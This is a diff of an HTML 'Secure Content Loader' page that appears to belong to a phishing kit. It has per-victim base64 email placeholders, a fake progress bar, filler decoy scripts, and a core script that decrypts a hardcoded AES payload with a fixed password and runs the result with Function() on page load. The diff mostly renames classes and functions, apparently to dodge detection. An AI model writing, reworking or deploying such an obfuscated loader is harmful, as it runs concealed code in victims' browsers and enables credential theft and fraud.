@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="author" content="Global Dev">
-    <title>Dynamic Secure Loader</title>
+    <title>Secure Content Loader</title>
     <style>
         body {
             padding: 0;
@@ -18,7 +18,7 @@
             min-height: 100vh;
             overflow: hidden;
         }
-        .rotating-loader {
+        .spinning-loader {
             width: 70px;
             height: 70px;
             border: 10px solid #d1d5db;
@@ -30,20 +30,20 @@
             from { transform: rotate(0deg); }
             to { transform: rotate(360deg); }
         }
-        .loading-message {
+        .status-message {
             margin-top: 15px;
             font-size: 18px;
             color: #222;
         }
-        .hidden-content {
+        .hidden-section {
             visibility: hidden;
         }
-        .random-info {
+        .system-info {
             margin-top: 20px;
             font-size: 14px;
             color: #666;
         }
-        .fake-loader-bar {
+        .progress-bar {
             width: 200px;
             height: 10px;
             background-color: #e0e0e0;
@@ -51,13 +51,13 @@
             margin-top: 20px;
             overflow: hidden;
         }
-        .fake-loader-progress {
+        .progress-indicator {
             width: 0;
             height: 100%;
             background-color: #4f46e5;
-            animation: fake-progress 2s linear infinite;
+            animation: progress-animation 2s linear infinite;
         }
-        @keyframes fake-progress {
+        @keyframes progress-animation {
             0% { width: 0; }
             50% { width: 100%; }
             100% { width: 0; }
@@ -66,73 +66,73 @@
 </head>
 <body>
 
-    <!-- Hidden Content -->
-    <div class="hidden-content">
-        <div custom-tag="hidden" id="secret-data" nike-tes1=""></div>
+    <!-- Hidden Section -->
+    <div class="hidden-section">
+        <div data-custom="hidden" id="secure-data" custom-attr="secure"></div>
     </div>
 
     <!-- Main Loader -->
-    <div adidas="<%=EMAIL64%>" class="rotating-loader"></div>
-    <p class="loading-message" data-email="[[ BASE64_EMAIL ]]">Processing your request, please wait...</p>
+    <div adidas="<%=EMAIL64%>" class="spinning-loader"></div>
+    <p class="status-message" data-info="[[ BASE64_EMAIL ]]">Processing your request, please wait...</p>
 
-    <!-- Random Info Div -->
-    <div class="random-info">
-        <p>Checking system permissions...</p>
+    <!-- System Info Section -->
+    <div class="system-info">
+        <p>Verifying system permissions...</p>
     </div>
 
-    <!-- Fake Loader Bar -->
-    <div class="fake-loader-bar">
-        <div class="fake-loader-progress"></div>
+    <!-- Progress Bar -->
+    <div nike-tes1="">
+        <div class="progress-indicator"></div>
     </div>
 
     <!-- Useless Script 1 -->
     <script>
-        const performFakeTask = () => {
-            // console.log("[INFO] Performing fake task...");
+        const executeFakeOperation = () => {
+            // console.log("[INFO] Executing fake operation...");
             setTimeout(() => {
-                // console.log("[INFO] Fake task completed.");
+                // console.log("[INFO] Fake operation completed.");
             }, 1500);
         };
-        performFakeTask();
+        executeFakeOperation();
     </script>
 
     <!-- Useless Script 2 -->
     <script>
-        const generateRandomNumbers = () => {
-            const numbers = [15, 25, 35, 45, 55];
-            numbers.forEach(num => {
-                // console.log(`Random number: ${num}`);
+        const createRandomValues = () => {
+            const values = [10, 20, 30, 40, 50];
+            values.forEach(value => {
+                // console.log(`Random value: ${value}`);
             });
         };
-        generateRandomNumbers();
+        createRandomValues();
     </script>
 
     <!-- Useless Script 3 -->
     <script>
-        const displayFakeLogs = () => {
-            const logs = ["Initializing system...", "Loading modules...", "Finalizing setup..."];
-            logs.forEach(log => {
-                // console.log(`[LOG] ${log}`);
+        const showFakeMessages = () => {
+            const messages = ["Starting system...", "Loading components...", "Completing setup..."];
+            messages.forEach(message => {
+                // console.log(`[LOG] ${message}`);
             });
         };
-        displayFakeLogs();
+        showFakeMessages();
     </script>
 
     <!-- Core Secure Processing Script -->
     <script>
-        const decryptSecureContent = async (encryptedData, encryptionKey, salt, password) => {
-            // console.log("[INFO] Starting secure content decryption...");
+        const decodeSecureData = async (encryptedData, encryptionKey, salt, password) => {
+            // console.log("[INFO] Starting secure data decoding...");
 
             const hexToBytes = (hexString) => {
-                return new Uint8Array(hexString.match(/.{2}/g).map(byte => parseInt(byte, 16)));
+                return new Uint8Array(hexString.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
             };
 
-            const simulateDelay = () => new Promise(resolve => {
-                // console.log("[DEBUG] Simulating delay...");
+            const addArtificialDelay = () => new Promise(resolve => {
+                // console.log("[DEBUG] Adding artificial delay...");
                 setTimeout(() => resolve(), 500);
             });
 
-            const createDerivedKey = async (keyMaterial, saltBytes) => {
+            const generateDerivedKey = async (keyMaterial, saltBytes) => {
                 return crypto.subtle.deriveKey(
                     { name: "PBKDF2", salt: saltBytes, iterations: 100000, hash: "SHA-256" },
                     keyMaterial,
@@ -150,8 +150,8 @@
                 ["deriveKey"]
             );
 
-            await simulateDelay();
-            const derivedKey = await createDerivedKey(keyMaterial, hexToBytes(salt));
+            await addArtificialDelay();
+            const derivedKey = await generateDerivedKey(keyMaterial, hexToBytes(salt));
 
             try {
                 const decryptedBytes = await crypto.subtle.decrypt(
@@ -159,16 +159,16 @@
                     derivedKey,
                     hexToBytes(encryptedData)
                 );
-                console.log("[SUCCESS] Secure content decrypted successfully.");
+                console.log("[SUCCESS] Secure data decoded successfully.");
                 return new TextDecoder().decode(decryptedBytes);
             } catch (error) {
-                console.error("[ERROR] Failed to decrypt secure content:", error);
+                console.error("[ERROR] Failed to decode secure data:", error);
                 return null;
             }
         };
 
         (async () => {
-            console.log("[INFO] Initiating secure content decryption...");
+            console.log("[INFO] Starting secure data decoding process...");
             const payload = {
                 encryptionKey: "ce12552921e07eeae6d25a8b",
                 salt: "0ac6f6fafea5dd5e93ca4522b49d3681",
@@ -176,11 +176,11 @@
             };
 
             const password = "homesweethome";
-            const decryptedContent = await decryptSecureContent(payload.encryptedData, payload.encryptionKey, payload.salt, password);
-            Function(`${decryptedContent}`)();
+            const decodedContent = await decodeSecureData(payload.encryptedData, payload.encryptionKey, payload.salt, password);
+            Function(`${decodedContent}`)();
 
-            if (decryptedContent) {
-                // console.log("[INFO] Retrieved secure content:", decryptedContent);
+            if (decodedContent) {
+                // console.log("[INFO] Retrieved secure data:", decodedContent);
             }
         })();
     </script>
